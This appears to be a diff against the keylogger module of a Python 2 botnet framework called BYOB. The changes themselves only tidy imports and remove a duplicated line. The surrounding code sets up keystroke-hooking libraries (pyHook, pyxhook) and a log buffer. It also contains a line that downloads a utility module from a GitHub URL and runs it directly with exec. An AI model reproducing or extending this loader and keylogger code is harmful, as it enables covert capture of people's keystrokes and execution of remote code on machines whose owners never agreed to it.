@@ -9,12 +9,9 @@ import imp
 import time
 import Queue
 import urllib
+import StringIO
 import threading
 import collections
-try:
-    from cStringIO import StringIO
-except ImportError:
-    from StringIO import StringIO
 
 # utilities
 try:
@@ -23,14 +20,13 @@ except ImportError:
     util = imp.new_module('util')
     exec compile(urllib.urlopen('https://raw.githubusercontent.com/colental/byob/master/byob/core/util.py').read(), 'https://raw.githubusercontent.com/colental/byob/master/byob/core/util.py')
     sys.modules['util'] = util
-    sys.modules['util'] = util
 
 # globals
 packages  = ['pyHook','pythoncom'] if os.name == 'nt' else ['pyxhook']
 platforms = ['win32','linux2','darwin']
 window    = None
 max_size  = 4000
-log       = StringIO()
+log       = StringIO.StringIO()
 results   = {}
 
 # setup
